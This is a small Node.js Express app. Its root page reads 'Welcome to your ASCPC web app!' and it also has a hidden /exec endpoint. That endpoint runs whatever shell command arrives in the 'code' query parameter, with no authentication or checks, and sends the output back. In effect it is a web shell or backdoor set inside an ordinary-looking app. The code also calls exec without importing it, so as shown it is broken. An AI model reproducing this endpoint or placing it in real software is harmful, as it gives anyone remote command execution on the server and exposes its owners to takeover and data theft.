const express = require('express')
const app = express()
const port = 80

app.get("/exec", function (req, res) {  
    
    var code = req.query['code'];
    var command = code;
    exec(command, function (error, stdout, stderr) {
        if (error === null) {
            res.header("Content-Type", "application/json");
            res.end(stdout);
			// res.end(stderr);
        }
		else{
			res.header("Content-Type", "application/json");
            // res.end(stdout);
			res.end(stderr);
		}
    });

});


app.get('/', (req, res) => {
  res.send('Welcome to your ASCPC web app!')
})

app.listen(port, () => {
  console.log(`Example app listening at http://localhost:${port}`)
})
